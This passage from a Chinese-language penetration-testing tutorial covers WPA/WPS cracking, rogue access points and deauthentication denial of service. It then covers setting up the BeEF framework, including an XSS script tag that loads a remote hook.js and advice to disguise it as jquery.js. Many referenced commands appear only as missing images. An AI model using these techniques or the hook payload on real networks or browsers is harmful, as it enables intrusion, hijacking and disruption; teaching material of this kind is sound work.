<li>使用字典，或基于WPS的攻击，来破解WPA和WPA2。</li>
<li>成功破解之后，自动把密钥保存在一个数据库中。</li>
<li>内部中间人引擎支持会话劫持。</li>
<li>暴力攻击，可以攻击HTTP、HTTPS、Telnet和FTP。</li>
</ul>
<p>Fern的界面很干净，它可以指导用户选择接口和扫描接入点。它将报告WEP和WPA/WPA2的接入点；从这时开始，即可通过点击适当的按钮来发起攻击。最初的Fern启动屏幕如下图所示。</p>
<p><img src="/img/posts/9f0a5a5d15544c21a8b8101c0a93dd6c.jpeg" alt="img"></p>
<p>Fern启动屏幕</p>
<p>尽管Fern是一个很好的工具，但大多数测试人员并不完全依赖它——如果识别密钥或者获得网络接入失败，失败的原因将隐藏在图形用户界面之后，这将使故障诊断变得很困难。</p>
<p>一个类似的应用程序是Wifite无线审计师（Wifite wireless auditor），其提出了一个基于文本的界面来支持测试。它已经被证明在测试领域是非常有效的，它的特点和优势包括以下几个方面：</p>
<p>Wifite支持通过在攻击之前改变攻击者的MAC地址为随机的MAC地址来实现匿名，然后，当所有的攻击完成之后再把MAC地址改回来。</p>
<p>通过信号强度对目标进行排序（用dB表示），并优先破解最近的接入点。</p>
<p>自动取消鉴定隐藏在网络中的客户端，用于显示SSID。</p>
<p>支持多种攻击类型。</p>
<p>如下图中显示的示例，选择攻击一个单一的目标dd_wep。不需要其他与该应用程序的交互，它自己完成了所有破解，并把破解的密钥保存到数据库中。</p>
<p><img src="/img/posts/7a409017c93c4bb59cbb457d0ee940ca.jpeg" alt="img"></p>
<p>启动Wifite攻击</p>
<p>虽然过时WEP的脆弱性众所周知，并被Kali的一些基本工具所证明，但强WPA加密协议该如何抵制攻击？</p>
<h2 id="6-攻击WPA和WPA2"><a href="#6-攻击WPA和WPA2" class="headerlink" title="6. 攻击WPA和WPA2"></a>6. 攻击WPA和WPA2</h2><p>无线访问保护（WiFi Protected Access，WPA）和无线访问保护2（WiFi Protected Access 2，WPA2）是用于解决WEP安全缺陷的无线安全协议。因为WPA协议可以为每一个数据包动态生成新的密钥，阻止那些导致无线保护访问失败的统计分析。然而，它们仍然很容易受到一些攻击技术的攻击。</p>
<p>WPA和WPA2经常使用预共享密钥（pre-shared key，PSK）进行部署，来提供访问点和无线客户端之间的安全通信。PSK是一个至少13个字符长的随机密码；如果不是13字符长，对一个已知的字典，使用暴力攻击来确定一个PSK是可能的。这是最常见的攻击。（注意，如果是在Enterprise模式中进行配置，其可以使用RADIUS认证服务器提供身份认证，从我们的角度来看，WPA是“牢不可破”的！）</p>
<p><strong>（1）暴力攻击</strong></p>
<p>不像WEP，可以被对大量数据包的统计分析所破解，WPA解密需要攻击者创建特定的、已知详细信息的数据包类型，如接入点和客户端之间的信号交换信息。</p>
<p>攻击一个WPA传输，应该执行以下步骤：</p>
<p><strong>1)、启动无线适配器，并使用ifconfig命令来确保已创建监控界面。</strong></p>
<p><strong>2)、使用airodump-ng-wlan0识别目标网络。</strong></p>
<p><strong>3)、开始使用以下命令捕获目标接入点和客户端之间的流量：</strong></p>
<p><img src="/img/posts/fca6316a7f3b4bec9045361a600439fb.jpeg" alt="img"></p>
<p>设置-c监控特定信道，–showack标志用来确保客户端计算机认可你的请求，即从无线接入点取消鉴定；而-w把输出写入一个用于后续字典攻击的文件中。这种攻击的典型输出如下图所示。</p>
<p><img src="/img/posts/67c942cb01db429ea2f871b85436dce9.jpeg" alt="img"></p>
<p>一个典型的输出</p>
<p><strong>4)、使该终端窗口处于打开状态，并打开另一个终端窗口发起取消鉴定攻击；这将迫使用户重新认证目标接入点，并再次交换WPA密钥。取消鉴定攻击的命令如下所示：</strong></p>
<p><img src="/img/posts/8f77ea29675c408dbd1d25022a57a366.jpeg" alt="img"></p>
<p>执行上述命令的结果如下图所示。</p>
<p><img src="/img/posts/e4df24f3f95a41f3989b5848db8e711d.jpeg" alt="img"></p>
<p>执行aireplay-ng-0 10命令</p>
<p>成功取消鉴定攻击将显示ACKs，这表明连接到目标接入点的客户端，已接收到刚刚发送的取消鉴定命令。</p>
<p><strong>5)、回顾最初用于监控无线传输的开放命令脚本，确保你捕获了4次握手信息。一个成功的WPA握手会在顶部右手边的控制台中显示。在下图的示例中，数据显示WPA握手的值是28：10：7B：61：20：32：</strong></p>
<p><img src="/img/posts/b5279a0501ce4c05afaa9fdfab9f6417.jpeg" alt="img"></p>
<p>捕获握手信息</p>
<p><strong>6)、由aircrack破解WPA密钥，使用一个定义的词库。由攻击者定义的，用于收集握手交互信息数据的文件名位于根目录下，而且-01.cap的扩展名将被加载到该文件名中。</strong></p>
<p>在Kali中，词库位于/usr/share/wordlists目录中。虽然几种词库均是可用的，但还是建议你下载在破解常见密码中最有效的列表。</p>
<p>在上述示例中，密钥被预先放置在密码列表里。实施字典攻击一段时间后，破解复杂的密码可能需要花费几个小时，这取决于该系统的配置。下面的命令使用字（words）作为源词库。</p>
<p>下图显示了成功破解WPA密钥的结果；网络监工的秘钥，在测试44个秘钥之后被发现是princessmouse。</p>
<p><img src="/img/posts/35ae2a1ca896484cab64f82f2b9f11b1.jpeg" alt="img"></p>
<p>发现秘钥</p>
<p>如果你手上没有一个定制的密码列表或者希望迅速生成一个列表，你可以使用Kali的crunch应用程序。下面的命令指导crunch程序使用给定的字符集，创建一个最小长度5字符和最大长度25字符的单词列表。</p>
<p><img src="/img/posts/3ced84ad40914e8b8a7da80819701e8d.jpeg" alt="img"></p>
<p>你还可以使用基于GPU的密码破解工具，提高暴力攻击的有效性（AMD/ATI的图形卡oclHashcat和英伟达显卡cudaHashcat）。</p>
<p>要实现这种攻击，首先需要使用以下命令把WPA握手信号交互捕获的文件psk-01.cap转换成hashcat文件：</p>
<p>转换完成后，针对最新捕获文件，使用以下命令运行hashcat（选择匹配你的CPU架构和图形卡的hashcat版本）：</p>
<p><img src="/img/posts/c1957b450a0c44078c567a318baffb3d.jpeg" alt="img"></p>
<p><strong>（2）使用Reaver攻击无线路由器</strong></p>
<p>WEP和WPA2也很容易受到针对无线保护设置的接入点、WPS和个人识别码的攻击。</p>
<p>大多数接入点支持WiFi保护设置（WiFi Protected Setup，WPS）协议，其在2006年成为一个允许用户很轻松地设置和配置接入点的标准，并可以为现有网络增加新设备，而无需重新输入大量且复杂的密码。</p>
<p>不幸的是，该个人识别码为一个8位数字序号（可能是100000000），并且最后一个数字是一个校验值。因为WPS认证协议把该个人识别码一分为二，并分别对其进行验证，那就意味着它的前半部分的值为104（10000），后半部分的值为103（1000）——攻击者只需通过进行最大数量为11000次猜测就能破解该接入点！</p>
<p>Reaver是一种旨在最大限度地进行猜测的工具（尽管Wifite同样可以进行WPS猜测）。</p>
<p>进行Reaver攻击，可以通过如下命令使用一个叫作wash的同类工具来识别网络的任何漏洞：</p>
<p>如果该网络有任何网络漏洞，可以使用如下命令发起对这些漏洞的攻击：</p>
<p>在Kali中测试这种攻击表明，这种攻击速度缓慢且容易失败；然而，它可以用作背景攻击，或者补充其他路由攻击来破解WPA网络。</p>
<h2 id="7-克隆接入点"><a href="#7-克隆接入点" class="headerlink" title="7. 克隆接入点"></a>7. 克隆接入点</h2><p>一个针对无线网络比较有趣的攻击是依赖克隆接入点，当用户试图连接到克隆点时，监测其传输的信息。攻击者不仅可以获得认证凭件，也可以使用中间人攻击拦截或重定向网络流量。</p>
<p>Kali中包含了几个声称用来支持克隆或盗窃接入点的工具；但是，此时这些工具有一些缺陷。比如，社会工程学的Toolkit和Websploit不能与预装在Kali系统中的DHCP服务器集成。</p>
<p>大多数攻击者都在寻找外部工具，包括Gerix或者easy-creds等脚本；自然，aircrack-ng组件也包含一个用于克隆接入点的airbase-ng工具。</p>
<p>为了伪造一个无线接入点，攻击者将完成以下任务：</p>
<p><strong>1)、在监视模式中启用wlan0端口，这将创建一个用于监视的mon0接口，使用以下命令：</strong></p>
<p><strong>2)、使用以下命令在mon0上建立接入点（AP）。社会工程学对成功的AP有重要的影响，例如，可以使用一个吸引目标客户端的名字。这个示例中，我们将使用一个通用的开放WiFi网络。它将在WiFi信道6上被建立：</strong></p>
<p><img src="/img/posts/e5d34df034744458908fdbb82b9ae01b.jpeg" alt="img"></p>
<p><strong>3)、使用如下命令安装公共桥：</strong></p>
<p><strong>4)、在另一个终端窗口中，创建一个桥（rogue），并且使用公共桥（注意，这些公共桥接必需首先使用apt-get install bridge-utils安装）连接at0（该at 0接口是通过前面的命令创建的）到eth0。</strong></p>
<p><img src="/img/posts/256bb7abde7942bcbc61fa8cf6e2b713.jpeg" alt="img"></p>
<p>因为这两个接口都集成到了该虚拟桥中，所以你可以使用如下命令获得它们的IP地址：</p>
<p><img src="/img/posts/0442c409bb9f4a539b82784aed5777b5.jpeg" alt="img"></p>
<p><strong>5)、使用以下命令启用桥接器之上的IP转发功能：</strong></p>
<p><strong>6)、使用如下命令，用局域网的IP地址配置该桥接器，使其连接到eth0端口：</strong></p>
<p><img src="/img/posts/e0c3d7a06b6a44ee9f53c0aef1b539dc.jpeg" alt="img"></p>
<p><strong>7)、使用如下命令，启用AP来嗅探认证握手交互信息：</strong></p>
<h2 id="8-拒绝服务攻击"><a href="#8-拒绝服务攻击" class="headerlink" title="8. 拒绝服务攻击"></a>8. 拒绝服务攻击</h2><p>我们将要评估的最后一个针对无线网络的攻击是拒绝服务攻击，在这里，攻击者将使合法用户访问无线网络的权限丧失，或通过致使网络崩溃的方法使网络不可用。无线网络极其容易受拒绝服务攻击，并且在分布式的无线网络上，很难定位攻击者。拒绝服务攻击的例子包括以下内容：</p>
<ul>
<li>注入制作网络命令，比如在无线网络上重新配置命令可能引起路由器、交换机和其他网络设备的失效。</li>
<li>一些设备和应用程序可以识别正在发生的攻击，并通过自动禁用网络来实现响应。恶意的攻击者可以发起一个很明显的攻击，然后让目标自己创建拒绝服务攻击。</li>
<li>用大量数据包洪泛攻击无线网络，可以致使该网络不可用；例如，HTTP洪泛攻击可以使数千个页面同时请求访问一个Web服务器，这可以耗尽该Web服务器的处理能力。在相同的方式下，使用认证和关联数据包块，用户可从其连接的接入点洪泛攻击该网络。</li>
<li>攻击者通过精心设计具体的解除认证和解除关联的命令，可以在无线网络中，用关闭授权连接来洪泛攻击该网络，并停止合法用户维护他们到无线接入点的连接。</li>
</ul>
<p>为了证明最后一点，我们将使用取消认证数据包，来创建一个泛洪拒绝服务攻击。因为无线802.11协议是在收到定义的数据包时建立的，且其支持解除认证（所以，当连接不需要时，用户可以中断该连接），这可能是一个毁灭性的攻击——它符合标准，并且没有办法可阻止其发生。</p>
<p>使合法用户关闭网络的最简单方法是针对他们使用一个解除认证数据包流。这些可以在aircrack-ng工具套件的帮助下完成，使用如下命令：</p>
<p>此命令确定攻击类型为-0，表明它是一个取消鉴定攻击。第二个0（零）发射连续的取消鉴定数据包流，使得网络无法为其他用户所用。</p>
<p>Websploit框架是用来扫描和分析远程系统的开源工具。它包含几个工具，包括特定的无线攻击工具。要启动它，需要打开一个命令脚本并简单地输入websploit。</p>
<p>该Websploit界面类似于recon-ng和Metasploit框架，并将其作为一个模块化接口显示给用户。</p>
<p>一经发起，可以使用show modules命令来显示在现有版本中的攻击模块。使用use wifi/wifi_jammer命令选择WiFi干扰发射机（一种取消鉴定数据包流）。如下图所示，攻击者只需要使用set命令来设置各种选项，然后选择run发起攻击。</p>
<h2 id="9-小结"><a href="#9-小结" class="headerlink" title="9.  小结"></a>9.  小结</h2><p>研究了针对无线网络攻击的几个成功的管理任务，包括无线适配器的选择、无线调制解调器的配置，以及侦察工具如aircrack-ng Kismet。我们重点使用了aircrack-ng的工具组件来确定隐藏网络，绕过MAC地址认证，并破解WEP和WPA/WPA2加密。我们也看到了如何克隆或复制无线接入点，以及如何针对无线网络执行拒绝服务攻击。</p>
<h1 id="八-浏览器攻击"><a href="#八-浏览器攻击" class="headerlink" title="八. 浏览器攻击"></a>八. 浏览器攻击</h1><p>笔者发现国内很少有系统介绍BeEF框架的文章，所以笔者决定写一个。内容涉及攻击浏览器的技术，主要介绍这些技术的原理，并如何操作BeEF来实现，不涉及浏览器本身漏洞（门槛太高，笔者有心无力）。</p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>在看这个系列之前，读者最好要有一定知识储备。首先是对HTTP协议（CORS、 CSP等）要有一定的理解，其次是理解Web安全的常见攻击技术的原理和防御方法（比如XSS、CSRF、SQL inject等）， 最后如果读者懂javascript语言就更好（可选，笔者的js也不咋地）。笔者认为学习BeEF框架的难度大概和学习Metasploit、 Burp Suite 的难度差不多。</p>
<p>下面给出学习这些知识的参考：</p>
<p>HTTP 协议相关文档：  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></p>
<p>浏览器攻击技术原理：  黑客攻防技术宝典浏览器实战篇 （书）</p>
<p>BeEF 框架相关文档：   <a href="https://github.com/beefproject/beef/wiki" target="_blank" rel="noopener">https://github.com/beefproject/beef/wiki</a></p>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>说到攻击浏览器，那么就一定要说同源策略（Same Origin Policy,  SOP）。 同源策略是用于限制不同来源的资源之间的交互。在浏览器上定义了对于不同的页面，如果他们的主机名、协议和端口都相同，即为同源。记得三个要素主机名、协议和端口。来个例子：</p>
<p><a href="http://www.a.com/index.html" target="_blank" rel="noopener">http://www.A.com/index.html</a>  的js是不能读/写 <a href="http://www.b.com/index.html," target="_blank" rel="noopener">http://www.B.com/index.html,</a> <a href="https://www.a.com/index.html," target="_blank" rel="noopener">https://www.A.com/index.html,</a>  <a href="http://www.a.com:8080/index.html" target="_blank" rel="noopener">http://www.A.com:8080/index.html</a> 的内容。</p>
<h2 id="BeEF框架"><a href="#BeEF框架" class="headerlink" title="BeEF框架"></a>BeEF框架</h2><p>BeEF（ The Browser Exploitation Framework） 是由Wade Alcorn 在2006年开始创建的，至今还在维护。是由ruby语言开发的专门针对浏览器攻击的框架。这个框架也属于cs的结构，具体可以看下图：</p>
<p><img src="/img/posts/15299931636046.png" alt="12.png"><br>zombie（僵尸）即受害的浏览器。zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI， 和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。</p>
<h2 id="BeEF-安装和配置"><a href="#BeEF-安装和配置" class="headerlink" title="BeEF 安装和配置"></a>BeEF 安装和配置</h2><p>BeEF 需要ruby 2.3 + 和 SQLite (或者mysql/postgres)。</p>
<h3 id="在kali下使用BeEF"><a href="#在kali下使用BeEF" class="headerlink" title="在kali下使用BeEF"></a>在kali下使用BeEF</h3><p>kali默认已经安装BeEF了。BeEF是Favorites 菜单中的一个（可以看出它的受欢迎程度和地位了），其标志是一个蓝色的公牛。命令是beef-xss:</p>
<p><img src="/img/posts/15300262657337.png" alt="13.png"></p>
<p>打开五秒后，它还会使用浏览器打开管理页面的UI，默认帐号密码是：beef/beef，默认管理页面的UI 地址是：<a href="http://127.0.0.1:3000/ui/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ui/panel</a></p>
<p>kali已经把beef-xss做成服务了，推荐使用systemctl 命令来启动或关闭beef服务器</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start <span class="keyword">beef-xss.service </span>   <span class="comment">#开启beef</span></span><br><span class="line"></span><br><span class="line">systemctl stop <span class="keyword">beef-xss.service </span>    <span class="comment">#关闭beef</span></span><br><span class="line"></span><br><span class="line">systemctl restart <span class="keyword">beef-xss.service </span> <span class="comment">#重启beef</span></span><br></pre></td></tr></table></figure>
<h3 id="在ubuntu17-10中安装BeEF"><a href="#在ubuntu17-10中安装BeEF" class="headerlink" title="在ubuntu17.10中安装BeEF"></a>在ubuntu17.10中安装BeEF</h3><p>如果只是作为测试或者学习，使用kali中beef就已经足够了。如果是希望在真实环境中使用，那么就需要一台拥有独立ip的主机（能被访问），下面笔者介绍在一台vps，系统是ubuntu 17.10系统中安装的过程， 如果没有vps， 可以跳过这一部分。</p>
<p>首先在vps中，初始用户一般是root。root是没法安装某些ruby的一些扩展包（考虑到安全问题），所以需要一个降权的用户。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建一个<span class="keyword">beef的用户</span></span><br><span class="line"><span class="keyword">useradd </span>-m -d /home/<span class="keyword">beef </span>-s /<span class="keyword">bin/bash </span><span class="keyword">beef</span></span><br><span class="line"><span class="keyword">#设置beef的密码,最好使用强密码</span></span><br><span class="line"><span class="keyword">passwd </span><span class="keyword">beef</span></span><br><span class="line"><span class="keyword">#把beef用户加入sudo， </span>root 组</span><br><span class="line"><span class="symbol">usermod</span> -aG root,sudo <span class="keyword">beef</span></span><br><span class="line"><span class="keyword">#转到beef用户</span></span><br><span class="line"><span class="keyword">su </span><span class="keyword">beef</span></span><br></pre></td></tr></table></figure>
<p>接着就是安装beef了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入家目录</span></span><br><span class="line">cd</span><br><span class="line"><span class="comment">#获取源文件</span></span><br><span class="line">wget https://github.com/beefproject/beef/archive/master.zip</span><br><span class="line">sudo apt <span class="keyword">update</span> &amp;&amp; sudo apt <span class="keyword">upgrade</span> -y &amp;&amp; sudo apt <span class="keyword">install</span> unzip ruby ruby-dev -y</span><br><span class="line"><span class="comment">#解压master.zip</span></span><br><span class="line">unzip master.zip</span><br><span class="line">cd beef-<span class="keyword">master</span></span><br><span class="line"><span class="comment">#安装beef</span></span><br><span class="line">./<span class="keyword">install</span></span><br></pre></td></tr></table></figure>
<p>笔者在安装过程中遇到/var/lib/gems/2.3.0, /usr/local/bin 这两个目录没有写权限的错误，下面是解决方法：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod g+w /var/<span class="class"><span class="keyword">lib</span>/<span class="title">gems</span>/2.3.0</span></span><br><span class="line">sudo chmod g+w /usr/local/bin</span><br><span class="line"><span class="comment">#再次运行</span></span><br><span class="line">./install</span><br></pre></td></tr></table></figure>
<p>环境不同也许读者会遇到别的错误。遇到错误可以先看一下错误信息，看看能否自行解决，如果不行，那么就查找网上帮助。在互联网中，想要找一个问题的答案，使用错误信息来搜索往往是最快的。</p>
<p>把beef从sudo, root 组中移除：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行</span></span><br><span class="line">sudo chmod g-w /var/<span class="class"><span class="keyword">lib</span>/<span class="title">gems</span>/2.3.0 &amp;&amp; <span class="title">sudo</span> <span class="title">chmod</span> <span class="title">g</span>-<span class="title">w</span> /<span class="title">usr</span>/<span class="title">local</span>/<span class="title">bin</span></span></span><br><span class="line">sudo gpasswd -d beef root &amp;&amp; gpasswd -d beef sudo</span><br></pre></td></tr></table></figure>
<p>最后运行beef， 建议别使用root来运行beef服务器， 既然已经创建了一个id为beef的用户，那么以后都以这个用户来运行beef服务器会更好。</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入beef所在目录</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/home/beef/beef-master</span></span><br><span class="line"><span class="comment">#以后台模式运行beef服务器，且即使ssh断开了，也不影响beef 服务器。</span></span><br><span class="line">nohup <span class="string">./beef</span> &amp;</span><br></pre></td></tr></table></figure>
<h3 id="配置BeEF"><a href="#配置BeEF" class="headerlink" title="配置BeEF"></a>配置BeEF</h3><p>kali下的BeEF配置文件在  /usr/share/beef-xss/config.yaml,其它的配置文件也在这个目录的子目录下，往后在使用某些功能时，需要修改对应的配置文件。自主安装的BeEF配置文件会在BeEF的主目录下config.yaml,建议修改几个地方：</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">### 指定某个网段，只有在这个网段的浏览器才能被hook</span><br><span class="line">permitted_hooking_subnet: <span class="string">"0.0.0.0/0"</span></span><br><span class="line"></span><br><span class="line">### 指定某个网段，只有在这个网段的浏览器才能访问管理UI</span><br><span class="line">permitted_ui_subnet: <span class="string">"0.0.0.0/0"</span></span><br><span class="line"></span><br><span class="line">### 上面这两项都是可以被绕过的，只要使用X-Forwarded-For首部绕过，一般不需要设置</span><br><span class="line"></span><br><span class="line">###  设置beef服务器的主机， 如果有自己的域名， 那么可以设置自己的域名, 没有就使用默认</span><br><span class="line">host: <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">###  设置beef服务器监听的端口， 可以自己定一个，比如<span class="number">8080</span>, 记得端口号需要大于<span class="number">1024</span></span><br><span class="line">port: <span class="string">"3000"</span></span><br><span class="line"></span><br><span class="line">### 受害浏览器轮询beef主机的时间， 默认为<span class="number">1</span>秒，可以设置为更低。 </span><br><span class="line">xhr_poll_timeout: <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">#public: <span class="string">""</span>      # public hostname/IP address</span><br><span class="line">#public_port: <span class="string">""</span> # experimental</span><br><span class="line">### 这是让BeEF运行在一个反向代理或者NAT环境下才需要设置的。</span><br><span class="line"></span><br><span class="line">### 管理页面的URI， 默认是/ui, 建议修改，这样就不会让别人找到你的管理页面</span><br><span class="line">web_ui_basepath: <span class="string">"/ui"</span></span><br><span class="line"></span><br><span class="line">### hook_file 的名称， 建议修改， 可以修改为jquery.js之类的来提升隐蔽性</span><br><span class="line">hook_file: <span class="string">"/hook.js"</span></span><br><span class="line"></span><br><span class="line">### 管理页面登录的用户名和密码， 这个一定要改，两个都改是最好的</span><br><span class="line">credentials:</span><br><span class="line">     user:   <span class="string">"beef"</span></span><br><span class="line">     passwd: <span class="string">"beef"</span></span><br></pre></td></tr></table></figure>
<h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>接下来实际使用BeEF，体验一下。先开启BeEF服务器，接着用浏览器访问管理页面<a href="http://127.0.0.1:3000/ui/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ui/panel</a>， 使用设置的用户/密码登录。</p>
<p>接着访问有勾子的页面<a href="http://127.0.0.1:3000/demos/basic.html" target="_blank" rel="noopener">http://127.0.0.1:3000/demos/basic.html</a> 这里的主机名和端口号要按照你设置的来修改， 这里要注意一下kali下beef版本的勾子不支持IE8，最新版或者旧一些的版本可以。所以要使用其他浏览器来访问有勾子的页面。</p>
<p>下面给出一个写有勾子的页面，把创建文件test.html，并把下面内容写到其中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://127.0.0.1:3000/hook.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 这里的主机和端口号，需要和配置文件的一致。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello World</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接着使用一个浏览器来打开，那么这个浏览器就会被hook了。</p>
<p>查看管理页面UI会是类似下面图：</p>
<p><img src="/img/posts/15300656117260.png" alt="8.png"></p>
<p><img src="/img/posts/15300659136276.png" alt="9.png"></p>
<p>选一个简单的模块来试试， 下图是选用了Host –&gt; Detect Virtual Machine 模块来查看受害浏览器是否在虚拟机上运行的：</p>
<p><img src="/img/posts/15300745052254.png" alt="14.png"></p>
<p>BeEF的入门使用就是这么简单，所有的功能都已经写好了，我们只需要选择模块，设置参数（有时不需要），点击Execute 就可以了。 当然必须知道这些模块的作用才行。</p>
<p>读者可能发现在每个模块的前面都有一个有色（绿色，灰色，橙色，红色）的小圆标志。</p>
<p><img src="/img/posts/15300748849474.png" alt="5.png"></p>
<p>在内部，BeEF可以检测出哪些命令模块可以在当前受害的浏览器工作， 并用颜色表示：</p>
<p>绿色：命令模块可以在目标浏览器上运行，且用户不会感到任何异常</p>
<p>橙色：命令模块可以在目标浏览器上运行，但是用户可能会感到异常（比如可能会有弹窗，提示，跳转等）</p>
<p>灰色：命令模块尚未针对此目标进行验证，即不知道能否可运行</p>
<p>红色：命令模块不适用于此目标</p>
<h2 id="浏览器攻击方法流程"><a href="#浏览器攻击方法流程" class="headerlink" title="浏览器攻击方法流程"></a>浏览器攻击方法流程</h2><p>攻击浏览器一般分为几个阶段，看下图：</p>
<p><img src="/img/posts/1530235168529.png" alt="1.png"></p>
<p>整个过程分为三个步骤，第一步是初始化控制，第二步是持续控制，第三步是攻击。在第三步中的七个攻击方法是可以交叉的，比如可以同时攻击用户和攻击Web应用。接下来会一一的介绍这些内容。</p>
<h2 id="初始化控制"><a href="#初始化控制" class="headerlink" title="初始化控制"></a>初始化控制</h2><p>首先介绍初始化控制的方法。初始化控制也就是想办法让BeEF服务器勾子（还记得上一章的hook.js吗）在用户浏览器中运行，勾子初次运行会收集一些有用的信息返回给服务器，并做好后续准备。初始化控制常见的攻击方法有以下几个：</p>
<blockquote>
<p>​          1.使用XSS攻击</p>
<p>​          2.使用有隐患的Web应用</p>
<p>​          3.使用广告网络</p>
<p>​          4.使用社会工程攻击</p>
<p>​          5.使用中间人攻击</p>
</blockquote>
<p>上面这个五个方法是比较常见，并不代表全部的攻击方法。下面就一一介绍这五种方法。</p>
<h2 id="使用XSS攻击"><a href="#使用XSS攻击" class="headerlink" title="使用XSS攻击"></a>使用XSS攻击</h2><p>Freebuf有很多关于XSS的文章，读者可以自行查阅。这里就不展开说，留点篇幅来介绍其他的方法。使用XSS攻击能在页面中插入类似下面的语句就可以了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:3000/hook.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果是在真实环境中使用，那么就有可能需要绕过XSS的防御机制。XSS的防御机制可以大致分为浏览器XSS防御机制和服务器的WAF。现代浏览器中都内置了XSS防御机制，比如Chrome和Safari的XSS Auditor, IE的XSS过滤器， 以及Firefox的NoScript扩展。笔者在用dwva做反射型xss测试时发现一个有意思的事情，国内的一些流行的浏览虽然能检测出XSS的向量，却还是加载并运行XSS的向量。至于服务器的WAF，这就有很多了。上述的两种XSS防御机制是有可能被绕过的。</p>
<p>对于BeEF这种需要加载远程js（hook.js）的XSS攻击，还有一种更好防御方法。那就是CSP(Content Security Policy, 内容安全策略)，CSP是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS" target="_blank" rel="noopener">XSS</a>) 和数据注入攻击等。这里只介绍CSP是如何防御BeEF这种攻击的，CSP详细的内容读者可以参考：</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives</a></p>
<p>对于防御BeEF这类需要加载远程js的攻击来说可以使用CSP规定页面从哪里加载脚本，同时还可以规定对这些脚本作出限制，比如限制执行javascript的eval()函数。</p>
